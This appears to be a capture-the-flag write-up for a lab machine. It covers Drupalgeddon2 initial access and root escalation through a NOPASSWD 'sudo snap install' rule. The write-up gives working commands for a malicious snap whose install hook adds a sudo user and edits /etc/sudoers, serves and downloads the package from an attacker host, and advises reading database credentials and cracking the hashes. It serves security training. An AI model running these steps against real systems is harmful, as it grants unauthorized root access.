Phase 1

Initial Access — Drupalgeddon2 (CVE-2018-7600)

Drupalgeddon2 — what it is Drupal 7.x/8.x's Form API mishandles certain request parameters, allowing unauthenticated remote code execution. The exploit sends a crafted POST to the form rendering endpoint, injecting PHP code that gets executed server-side. Named "Drupalgeddon2" because it was the second devastating RCE in Drupal's history. Fixed in Drupal 7.58/8.5.1.

Phase 3

Privilege Escalation — sudo snap install Malicious Package

Sudo Enumeration

[brucetherealadmin@armageddon ~]$ sudo -l
(root) NOPASSWD: /usr/bin/snap install *
snap install hooks = root code execution .snap packages can include hooks — shell scripts that run during lifecycle events. The install hook executes automatically when the package is installed, and snapd runs it as root. With confinement: devmode (developer mode), the sandbox is disabled, so the hook script has unrestricted access to the host filesystem. Since we can sudo snap install, we control what code root executes.

Build Malicious Snap (No snapcraft needed)

A .snap is just a SquashFS image — mksquashfs is all we need:

# On attacker machine:

# 1. Create directory structure
$ rm -rf /tmp/fake_snap
$ mkdir -p /tmp/fake_snap/meta/hooks

# 2. Write malicious install hook — creates a sudo-enabled user
$ cat > /tmp/fake_snap/meta/hooks/install << "EOF"
#!/bin/bash
password="snap_user"
pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
useradd snap_user -m -p $pass -s /bin/bash
usermod -aG sudo snap_user
echo "snap_user ALL=(ALL:ALL) ALL" >> /etc/sudoers
EOF
$ chmod +x /tmp/fake_snap/meta/hooks/install

# 3. Write snap.yaml — devmode disables the sandbox
$ cat > /tmp/fake_snap/meta/snap.yaml << "EOF"
name: snap-user
version: '0.1'
summary: Exploit
description: Exploit
confinement: devmode
EOF

# 4. Package as .snap
$ mksquashfs /tmp/fake_snap /tmp/snap-user_0.1_amd64.snap -noappend -comp xz

# 5. Serve it
$ python3 -m http.server 8888

Install and Escalate

# On target: download and install
[brucetherealadmin@armageddon ~]$ curl -o x.snap http://10.10.15.65:8888/snap-user_0.1_amd64.snap

# --dangerous skips signature verification, --devmode disables sandbox
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install x.snap --dangerous --devmode

# The install hook created snap_user with sudo privileges
[brucetherealadmin@armageddon ~]$ su - snap_user
Password: snap_user

Appendix

Key Takeaways

Drupalgeddon2 is a one-shot pre-auth RCE.

Drupal 7 ≤ 7.57 is instantly exploitable with public tools. If you see Drupal 7 in nmap output, this is the first thing to try.

Drupal's settings.php always contains database credentials.

After any foothold on a Drupal site, read /sites/default/settings.php — the database password is right there in plaintext.

Drupal 7 hashes ($S$) use hashcat mode 7900.

They're iterated SHA-512 with a site-specific salt, but weak passwords like booboo still fall quickly to rockyou.

sudo snap install * is a dangerous wildcard.

The * means any package, --dangerous skips signing, and --devmode removes the sandbox. The install hook runs as root with full host access. Never grant snap install as NOPASSWD sudo.

You don't need snapcraft to build a .snap.

mksquashfs + a meta/snap.yaml + a meta/hooks/install script is all it takes. The "package" is just a compressed filesystem image.
